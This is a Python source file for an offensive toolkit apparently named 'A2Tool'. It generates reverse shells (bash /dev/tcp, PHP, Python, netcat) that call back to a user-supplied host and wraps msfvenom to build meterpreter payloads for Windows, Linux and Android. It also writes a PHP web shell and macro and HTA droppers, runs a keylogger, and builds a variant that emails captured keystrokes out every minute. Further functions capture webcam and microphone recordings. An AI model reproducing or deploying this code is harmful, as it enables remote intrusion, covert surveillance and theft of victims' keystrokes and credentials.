#!/usr/bin/env python3
import os, sys, time, base64, subprocess, threading, hashlib
from colorama import Fore, Style, init; init(autoreset=True)
R=Fore.RED;G=Fore.GREEN;Y=Fore.YELLOW;B=Fore.BLUE;M=Fore.MAGENTA;C=Fore.CYAN;W=Fore.WHITE;RS=Style.RESET_ALL
IS_WINDOWS=os.name=='nt'

def generate_reverse_shell(choice):
    lh=input(Y+"  LHOST: "+RS).strip()
    lp=input(Y+"  LPORT: "+RS).strip() or '4444'
    print(f"\n{C}[*] Generated:{RS}")
    if choice=='1': print(f"{W}nc -lvnp {lp}{RS}")
    elif choice=='2': print(f"{W}php -r '$s=fsockopen(\"{lh}\",{lp});exec(\"/bin/sh -i <&3 >&3 2>&3\");'{RS}")
    elif choice=='3': print(f"{W}python -c 'import socket,subprocess;s=socket.socket();s.connect((\"{lh}\",{lp}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'{RS}")
    elif choice=='4': print(f"{W}bash -i >& /dev/tcp/{lh}/{lp} 0>&1{RS}")
    elif choice=='5': print(f"{W}powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"...\"{RS}")
    elif choice=='6': print(f"{G}[+] Use: msfconsole -> use exploit/multi/handler{RS}")
    elif choice=='7': print(f"{W}nc -lvnp {lp} -e /bin/sh{RS}")
    input(Y+"[+] Press Enter..."+RS)

def camera_exploit(choice):
    if choice=='1':
        print(f"\n{C}[*] Webcam snapshot...{RS}")
        try:
            import cv2
            cap=cv2.VideoCapture(0)
            ret,frame=cap.read()
            if ret:
                fname=f"webcam_{time.strftime('%Y%m%d_%H%M%S')}.jpg"
                cv2.imwrite(fname,frame)
                print(f"{G}[+] Saved: {fname}{RS}")
            cap.release()
        except ImportError: print(f"{Y}[!] pip install opencv-python{RS}")
        except Exception as e: print(f"{R}[!] {e}{RS}")
    elif choice=='2':
        print(f"\n{C}[*] Audio recording...{RS}")
        try:
            import sounddevice as sd, soundfile as sf
            dur=int(input(Y+"  Duration (sec): "+RS).strip() or '5')
            fs=44100
            print(f"{Y}[*] Recording {dur}s...{RS}")
            rec=sd.rec(int(dur*fs),samplerate=fs,channels=1)
            sd.wait()
            fname=f"mic_{time.strftime('%Y%m%d_%H%M%S')}.wav"
            sf.write(fname,rec,fs)
            print(f"{G}[+] Saved: {fname}{RS}")
        except ImportError: print(f"{Y}[!] pip install sounddevice soundfile{RS}")
        except Exception as e: print(f"{R}[!] {e}{RS}")
    elif choice=='4':
        print(f"\n{C}[*] IP Camera Scanner...{RS}")
        print(f"{Y}[!] Check: https://www.shodan.io/search?query=webcam{RS}")
    else: print(f"{Y}[!] Option not implemented.{RS}")
    input(Y+"[+] Press Enter..."+RS)

def keylogger_tool(choice):
    print(f"\n{Y}╔══[ Keylogger ]══╗{RS}")
    if choice=='1':
        try:
            from pynput import keyboard
            logfile=f"keylog_{time.strftime('%Y%m%d_%H%M%S')}.txt"
            print(f"{G}[+] Logging to: {logfile}{RS}")
            print(f"{Y}[!] ESC to stop.{RS}")
            def on_press(k):
                try:
                    with open(logfile,'a') as f: f.write(f'{k.char}')
                except: pass
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except ImportError: print(f"{Y}[!] pip install pynput{RS}")
    elif choice=='2':
        email=input(Y+"  Gmail: "+RS).strip()
        pwd=input(Y+"  App password: "+RS).strip()
        if email and pwd:
            outdir=os.path.join(os.path.dirname(os.path.dirname(__file__)),'payloads')
            os.makedirs(outdir,exist_ok=True)
            code=f'''from pynput import keyboard
import smtplib, threading
log=""
def send():
    global log
    if log:
        s=smtplib.SMTP('smtp.gmail.com',587)
        s.starttls()
        s.login("{email}","{pwd}")
        s.sendmail("{email}","{email}",log)
        log=""
    threading.Timer(60,send).start()
def on_press(k):
    global log
    log+=str(k)
with keyboard.Listener(on_press=on_press) as l:
    send()
    l.join()'''
            with open(os.path.join(outdir,'email_keylogger.py'),'w') as f: f.write(code)
            print(f"{G}[+] Saved to payloads/email_keylogger.py{RS}")
    else: print(f"{C}[*] Keylogger demo available.{RS}")
    input(Y+"[+] Press Enter..."+RS)

def crypto_tools(choice):
    if choice=='1':
        op=input(Y+"  Encrypt or Decrypt? (e/d): "+RS).strip().lower()
        data=input(Y+"  Data: "+RS).strip()
        key=input(Y+"  AES Key (16 chars): "+RS).strip() or 'a2toolsecretkey!'
        key=key.ljust(16)[:16].encode()
        try:
            from Crypto.Cipher import AES
            if op=='e':
                cipher=AES.new(key,AES.MODE_EAX)
                ct,tag=cipher.encrypt_and_digest(data.encode())
                result=base64.b64encode(cipher.nonce+tag+ct).decode()
                print(f"{G}[+] Encrypted: {result}{RS}")
            elif op=='d':
                raw=base64.b64decode(data.encode())
                nonce,tag,ct=raw[:16],raw[16:32],raw[32:]
                cipher=AES.new(key,AES.MODE_EAX,nonce=nonce)
                pt=cipher.decrypt_and_verify(ct,tag)
                print(f"{G}[+] Decrypted: {pt.decode()}{RS}")
        except ImportError: print(f"{Y}[!] pip install pycryptodome{RS}")
    elif choice=='2':
        try:
            from Crypto.PublicKey import RSA
            key=RSA.generate(2048)
            outdir=os.path.join(os.path.dirname(os.path.dirname(__file__)),'payloads')
            os.makedirs(outdir,exist_ok=True)
            with open(os.path.join(outdir,'private.pem'),'w') as f: f.write(key.export_key().decode())
            with open(os.path.join(outdir,'public.pem'),'w') as f: f.write(key.publickey().export_key().decode())
            print(f"{G}[+] RSA keys saved to payloads/{RS}")
        except ImportError: print(f"{Y}[!] pip install pycryptodome{RS}")
    elif choice=='3':
        s=input(Y+"  String: "+RS).strip()
        print(f"{G}[+] Base64: {base64.b64encode(s.encode()).decode()}{RS}")
        print(f"{G}[+] Hex: {s.encode().hex()}{RS}")
    elif choice=='4':
        s=input(Y+"  String: "+RS).strip()
        print(f"{G}[+] MD5: {hashlib.md5(s.encode()).hexdigest()}{RS}")
        print(f"{G}[+] SHA1: {hashlib.sha1(s.encode()).hexdigest()}{RS}")
        print(f"{G}[+] SHA256: {hashlib.sha256(s.encode()).hexdigest()}{RS}")
    elif choice=='5':
        s=input(Y+"  Text: "+RS).strip()
        shift=int(input(Y+"  Shift: "+RS).strip() or '3')
        r=''.join(chr((ord(c)-97+shift)%26+97) if c.islower() else chr((ord(c)-65+shift)%26+65) if c.isupper() else c for c in s)
        print(f"{G}[+] Caesar: {r}{RS}")
    elif choice=='6':
        s=input(Y+"  Text: "+RS).strip()
        k=input(Y+"  XOR Key: "+RS).strip() or 'A2'
        r=''.join(chr(ord(c)^ord(k[i%len(k)])) for i,c in enumerate(s))
        print(f"{G}[+] XOR (b64): {base64.b64encode(r.encode()).decode()}{RS}")
    input(Y+"[+] Press Enter..."+RS)

def menu():
    while True:
        os.system('cls' if IS_WINDOWS else 'clear')
        print(f"""{G}
  ╔═══════════════════════════════════════════════════════╗
  ║  {W}A2Tool - Payload Generator{R}                           {G}║
  ╠═══════════════════════════════════════════════════════╣
  ║  {W}[1] {R}Windows Executable (msfvenom)                      {G}║
  ║  {W}[2] {R}Linux Executable (msfvenom)                        {G}║
  ║  {W}[3] {R}Android APK (msfvenom)                             {G}║
  ║  {W}[4] {R}PHP WebShell                                       {G}║
  ║  {W}[5] {R}Python Reverse Shell                               {G}║
  ║  {W}[6] {R}Macro-Enabled Office Document                      {G}║
  ║  {W}[7] {R}HTA Payload                                        {G}║
  ║  {W}[8] {R}Custom Payload Builder                             {G}║
  ║  {W}[0] {R}Back to Main Menu                                 {G}║
  ╚═══════════════════════════════════════════════════════╝
{RS}""")
        choice=input(f"{Y}  A2Tool[Payload] » {RS}").strip()
        if choice=='0': break
        outdir=os.path.join(os.path.dirname(os.path.dirname(__file__)),'payloads')
        os.makedirs(outdir,exist_ok=True)
        if choice in ['1','2','3']:
            lh=input(Y+"  LHOST: "+RS).strip()
            lp=input(Y+"  LPORT: "+RS).strip() or '4444'
            maps={'1':('windows/meterpreter/reverse_tcp','exe','payload.exe'),
                  '2':('linux/x64/meterpreter/reverse_tcp','elf','payload.elf'),
                  '3':('android/meterpreter/reverse_tcp','apk','payload.apk')}
            p,fmt,fname=maps[choice]
            fpath=os.path.join(outdir,fname)
            cmd=f'msfvenom -p {p} LHOST={lh} LPORT={lp} -f {fmt} -o {fpath}'
            print(f"{C}[*] {cmd}{RS}"); os.system(cmd)
        elif choice=='4':
            pwd=input(Y+"  Password: "+RS).strip() or 'a2tool'
            with open(os.path.join(outdir,'webshell.php'),'w') as f: f.write(f'<?php system($_GET["{pwd}"]); ?>')
            print(f"{G}[+] Saved webshell.php{RS}")
        elif choice=='5':
            lh=input(Y+"  LHOST: "+RS).strip()
            lp=input(Y+"  LPORT: "+RS).strip() or '4444'
            code=f'import socket,subprocess,os;s=socket.socket();s.connect(("{lh}",{lp}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
            with open(os.path.join(outdir,'reverse_shell.py'),'w') as f: f.write(code)
            with open(os.path.join(outdir,'reverse_shell.pyw'),'w') as f: f.write(code)
            print(f"{G}[+] Saved reverse_shell.py/.pyw{RS}")
        elif choice=='6':
            lh=input(Y+"  LHOST: "+RS).strip()
            lp=input(Y+"  LPORT: "+RS).strip() or '4444'
            vba=f'''Sub AutoOpen()
    Dim str As String
    str = "powershell -NoP -NonI -W Hidden -Exec Bypass -c ..."
    CreateObject("WScript.Shell").Run str, 0
End Sub'''
            with open(os.path.join(outdir,'macro.vba'),'w') as f: f.write(vba)
            print(f"{G}[+] Saved macro.vba{RS}")
        elif choice=='7':
            lh=input(Y+"  LHOST: "+RS).strip()
            lp=input(Y+"  LPORT: "+RS).strip() or '4444'
            hta=f'''<html><head><script>
var c=new ActiveXObject("WScript.Shell");
c.Run("powershell -NoP -NonI -W Hidden -Exec Bypass -c ...");
</script></head><body></body></html>'''
            with open(os.path.join(outdir,'payload.hta'),'w') as f: f.write(hta)
            print(f"{G}[+] Saved payload.hta{RS}")
        elif choice=='8':
            cmd=input(Y+"  Command: "+RS).strip()
            ft=input(Y+"  Type (bat/ps1/sh): "+RS).strip() or 'bat'
            with open(os.path.join(outdir,f'custom.{ft}'),'w') as f: f.write(cmd)
            print(f"{G}[+] Saved custom.{ft}{RS}")
        else: print(f"{R}[!] Invalid.{RS}"); time.sleep(1)

if __name__=='__main__': menu()
